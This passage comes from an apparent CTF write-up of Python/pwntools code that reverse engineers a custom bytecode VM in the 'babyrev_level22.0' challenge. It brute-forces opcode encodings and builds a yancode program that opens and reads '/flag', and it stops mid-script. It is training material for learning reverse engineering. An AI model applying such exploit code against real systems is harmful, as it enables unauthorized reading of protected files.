none:4</span></span><br><span class="line"><span class="comment">### add:2</span></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## test exit</span></span><br><span class="line"><span class="comment">### sys:16, exit:1</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for i in table:</span></span><br><span class="line"><span class="comment">#     for j in table:</span></span><br><span class="line"><span class="comment">#         a = []</span></span><br><span class="line"><span class="comment">#         a.append(5)</span></span><br><span class="line"><span class="comment">#         a.append(j)</span></span><br><span class="line"><span class="comment">#         a.append(i)</span></span><br><span class="line"><span class="comment">#         a += [0] * 0x300</span></span><br><span class="line"><span class="comment">#         a = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#         p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#         p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a)</span></span><br><span class="line"><span class="comment">#         h = p.recv(4096)</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"><span class="comment">#         print(j)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## test interpret_imm, opcode | search : &quot;exit code 5&quot;</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for i in table:</span></span><br><span class="line"><span class="comment">#     for j in table:</span></span><br><span class="line"><span class="comment">#         a = []</span></span><br><span class="line"><span class="comment">#         a.append(5)</span></span><br><span class="line"><span class="comment">#         a.append(j)</span></span><br><span class="line"><span class="comment">#         a.append(i)</span></span><br><span class="line"><span class="comment">#         a.append(0)</span></span><br><span class="line"><span class="comment">#         a.append(16)</span></span><br><span class="line"><span class="comment">#         a.append(1)</span></span><br><span class="line"><span class="comment">#         a += [0] * 0x250</span></span><br><span class="line"><span class="comment">#         a = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#         p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#         p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a)</span></span><br><span class="line"><span class="comment">#         h = p.recv(4096)</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"><span class="comment">#         print(j)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## test sleep 128</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for i in table:</span></span><br><span class="line"><span class="comment">#     a = []</span></span><br><span class="line"><span class="comment">#     a.append(0x10)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 0</span></span><br><span class="line"><span class="comment">#     a.append(0x10)</span></span><br><span class="line"><span class="comment">#     a.append(i)</span></span><br><span class="line"><span class="comment">#     a.append(1) # sleep</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a)</span></span><br><span class="line"><span class="comment">#     p.interactive()</span></span><br><span class="line"><span class="comment">#     # print(h)</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use exit and add can exploit all the regs</span></span><br><span class="line"><span class="comment">## find add first:2</span></span><br><span class="line"><span class="comment"># import time</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for j in table:</span></span><br><span class="line"><span class="comment">#     print(j)</span></span><br><span class="line"><span class="comment">#     a = []</span></span><br><span class="line"><span class="comment">#     a.append(3)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 3</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(j) # test add</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a_byte = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a_byte)</span></span><br><span class="line"><span class="comment">#     time.sleep(0.1)</span></span><br><span class="line"><span class="comment">#     p.kill()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## test ldm</span></span><br><span class="line"><span class="comment"># 32</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for j in table:</span></span><br><span class="line"><span class="comment">#     print(j)</span></span><br><span class="line"><span class="comment">#     a = []</span></span><br><span class="line"><span class="comment">#     a.append(3)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 10</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(j) # test ldm</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a_byte = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a_byte)</span></span><br><span class="line"><span class="comment">#     time.sleep(0.1)</span></span><br><span class="line"><span class="comment">#     p.kill()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## test stm</span></span><br><span class="line"><span class="comment"># 64</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for j in table:</span></span><br><span class="line"><span class="comment">#     print(j)</span></span><br><span class="line"><span class="comment">#     a = []</span></span><br><span class="line"><span class="comment">#     a.append(3)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 3</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(j) # test stm opcode[768] = 3;</span></span><br><span class="line"><span class="comment">#     a.append(5)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 5 # failed to write</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(32) # ldm</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a_byte = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a_byte)</span></span><br><span class="line"><span class="comment">#     time.sleep(0.1)</span></span><br><span class="line"><span class="comment">#     p.kill()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # write</span></span><br><span class="line"><span class="comment"># # write:4</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for j in table:</span></span><br><span class="line"><span class="comment">#     if (j == 16 or j == 128 or j == 2 or j == 32):</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     print(j)</span></span><br><span class="line"><span class="comment">#     a = []</span></span><br><span class="line"><span class="comment">#     a.append(ord(&#x27;^&#x27;))</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = ord(&#x27;^&#x27;)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(64) # stm opcode[768] = ord(&#x27;^&#x27;);</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[[1]] ++</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(64) # stm opcode[769] = ord(&#x27;^&#x27;);</span></span><br><span class="line"><span class="comment">#     a.append(2)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[[1]] ++</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(64) # stm opcode[769] = ord(&#x27;^&#x27;);</span></span><br><span class="line"><span class="comment">#     for i in table: # all register = 1</span></span><br><span class="line"><span class="comment">#         if (i == 8 or i == 4 or i == 64):</span></span><br><span class="line"><span class="comment">#             continue</span></span><br><span class="line"><span class="comment">#         a.append(1)</span></span><br><span class="line"><span class="comment">#         a.append(i)</span></span><br><span class="line"><span class="comment">#         a.append(4)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 1 # fd = io</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(j)</span></span><br><span class="line"><span class="comment">#     a.append(1) # write</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a_byte = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a_byte)</span></span><br><span class="line"><span class="comment">#     time.sleep(0.3)</span></span><br><span class="line"><span class="comment">#     print(p.recv())</span></span><br><span class="line"><span class="comment">#     p.kill()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ## opcode[1025]</span></span><br><span class="line"><span class="comment"># # 1</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># tmp_a = []</span></span><br><span class="line"><span class="comment"># tmp_a.append(ord(&#x27;^&#x27;))</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[1024] = ord(&#x27;^&#x27;)</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(64) # stm opcode[768] = ord(&#x27;^&#x27;);</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[[1]] ++</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(64) # stm opcode[769] = ord(&#x27;^&#x27;);</span></span><br><span class="line"><span class="comment"># tmp_a.append(2)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[[1]] ++</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(64) # stm opcode[769] = ord(&#x27;^&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for k in table: # test_register = 1</span></span><br><span class="line"><span class="comment">#     a = tmp_a.copy()</span></span><br><span class="line"><span class="comment">#     # print(a)</span></span><br><span class="line"><span class="comment">#     if (k == 8 or k == 4 or k == 64):</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     for i in table: # all register = 0</span></span><br><span class="line"><span class="comment">#         if (i == 8 or i == 4 or i == 64):</span></span><br><span class="line"><span class="comment">#             continue</span></span><br><span class="line"><span class="comment">#         a.append(0)</span></span><br><span class="line"><span class="comment">#         a.append(i)</span></span><br><span class="line"><span class="comment">#         a.append(4)</span></span><br><span class="line"><span class="comment">#     print(k)</span></span><br><span class="line"><span class="comment">#     a.append(2)</span></span><br><span class="line"><span class="comment">#     a.append(k)</span></span><br><span class="line"><span class="comment">#     a.append(4) # one register = 1    </span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 1 # fd = io</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(4)</span></span><br><span class="line"><span class="comment">#     a.append(1) # write</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a_byte = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a_byte)</span></span><br><span class="line"><span class="comment">#     time.sleep(0.1)</span></span><br><span class="line"><span class="comment">#     print(p.recv())</span></span><br><span class="line"><span class="comment">#     p.kill()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##  opcode[1025]</span></span><br><span class="line"><span class="comment"># 32</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># tmp_a = []</span></span><br><span class="line"><span class="comment"># tmp_a.append(ord(&#x27;^&#x27;))</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[1024] = ord(&#x27;^&#x27;)</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(64) # stm opcode[768] = ord(&#x27;^&#x27;);</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[[1]] ++</span></span><br><span class="line"><span class="comment"># tmp_a.append(ord(&#x27;@&#x27;))</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[1024] = ord(&#x27;^&#x27;)</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(64) # stm opcode[769] = ord(&#x27;^&#x27;);</span></span><br><span class="line"><span class="comment"># tmp_a.append(2)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[[1]] ++</span></span><br><span class="line"><span class="comment"># tmp_a.append(ord(&#x27;#&#x27;))</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(4) # opcode[1024] = ord(&#x27;^&#x27;)</span></span><br><span class="line"><span class="comment"># tmp_a.append(8)</span></span><br><span class="line"><span class="comment"># tmp_a.append(1)</span></span><br><span class="line"><span class="comment"># tmp_a.append(64) # stm opcode[769] = ord(&#x27;^&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for k in table: # test opcode[1025]</span></span><br><span class="line"><span class="comment">#     if (k == 1 or k == 8 or k == 64 or k == 4):</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     a = tmp_a.copy()</span></span><br><span class="line"><span class="comment">#     # print(a)</span></span><br><span class="line"><span class="comment">#     for i in table: # all register = 0</span></span><br><span class="line"><span class="comment">#         if (i == 8 or i == 4 or i == 64 or i == 1):</span></span><br><span class="line"><span class="comment">#             continue</span></span><br><span class="line"><span class="comment">#         a.append(0)</span></span><br><span class="line"><span class="comment">#         a.append(i)</span></span><br><span class="line"><span class="comment">#         a.append(4)</span></span><br><span class="line"><span class="comment">#     print(k)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(k)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1025] # offset: 1  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1026] # len: 1  </span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 1 # fd = io</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(4)</span></span><br><span class="line"><span class="comment">#     a.append(1) # write</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a_byte = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a_byte)</span></span><br><span class="line"><span class="comment">#     time.sleep(0.1)</span></span><br><span class="line"><span class="comment">#     print(p.recv())</span></span><br><span class="line"><span class="comment">#     p.kill()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # read</span></span><br><span class="line"><span class="comment"># 32</span></span><br><span class="line"><span class="comment"># table = [1,2,4,8,16,32,64,0x80]</span></span><br><span class="line"><span class="comment"># for k in [2,32]: # test read</span></span><br><span class="line"><span class="comment">#     a = []</span></span><br><span class="line"><span class="comment">#     print(k)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(32)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1025] # offset: 1  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1026] # len: 1 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 0 # fd = io</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     a.append(2)</span></span><br><span class="line"><span class="comment">#     a.append(k)</span></span><br><span class="line"><span class="comment">#     a.append(1) # read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(8)</span></span><br><span class="line"><span class="comment">#     a.append(4) # opcode[1024] = 1 # fd = io</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     a.append(1)</span></span><br><span class="line"><span class="comment">#     a.append(4)</span></span><br><span class="line"><span class="comment">#     a.append(1) # write</span></span><br><span class="line"><span class="comment">#     a.append(0)</span></span><br><span class="line"><span class="comment">#     a.append(16)</span></span><br><span class="line"><span class="comment">#     a.append(1) # exit</span></span><br><span class="line"><span class="comment">#     a_byte = b&#x27;&#x27;.join([bytes([i]) for i in a])</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;/challenge/babyrev_level22.0&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;,a_byte)</span></span><br><span class="line"><span class="comment">#     time.sleep(0.1)</span></span><br><span class="line"><span class="comment">#     # print(p.recv())</span></span><br><span class="line"><span class="comment">#     p.interactive()</span></span><br><span class="line"><span class="comment">#     p.kill()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------------------------------------------------------------------- #</span></span><br><span class="line"><span class="comment">#                                                               open -&gt; </span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------------------------------------------------------------------- #</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;opcode[1024]&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;opcode[1025]&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;opcode[1026]&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;opcode[1027]&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;opcode[1028]&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;opcode[1029]&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">64</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;err register&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_instruction</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_imm&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_add&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_stk&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_stm&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">64</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_ldm&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">32</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_cmp&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_jmp&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;interpret_sys&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;err instruction&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_imm</span>(<span class="params">regs,value</span>):</span><br><span class="line">    <span class="keyword">return</span> interpret_instruction(<span class="string">&#x27;interpret_imm&#x27;</span>) + (register(regs) &lt;&lt; <span class="number">8</span>) + (value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_stm</span>():</span><br><span class="line">    <span class="comment"># opcode[1025] = offset</span></span><br><span class="line">    <span class="comment"># opcode[1026] = value</span></span><br><span class="line">    <span class="keyword">return</span> interpret_instruction(<span class="string">&#x27;interpret_stm&#x27;</span>) + (register(<span class="string">&#x27;opcode[1025]&#x27;</span>) &lt;&lt; <span class="number">8</span>) + (register(<span class="string">&#x27;opcode[1026]&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_sys</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;open&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;read_code&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;read&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">32</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;write&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;sleep&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">128</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;exit&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">16</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;err sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open</span>():</span><br><span class="line">    <span class="comment"># opcode[opcode[1024] + 768] = addr</span></span><br><span class="line">    <span class="comment"># opcode[1024] = fd</span></span><br><span class="line">    <span class="comment"># opcode[1026] = len</span></span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;open&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>) + (register(<span class="string">&#x27;opcode[1024]&#x27;</span>) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="comment"># opcode[1024] = fd</span></span><br><span class="line">    <span class="comment"># opcode[1025] = ret len</span></span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;read&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>) + (register(<span class="string">&#x27;opcode[1025]&#x27;</span>) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="comment"># opcode[1024] = fd</span></span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;write&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>) + (register(<span class="string">&#x27;opcode[1025]&#x27;</span>) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitPro</span>():</span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;exit&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line">opcode_func = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,0) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;/&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,1) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;f&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,2) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;l&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,3) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;a&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,4) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;g&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 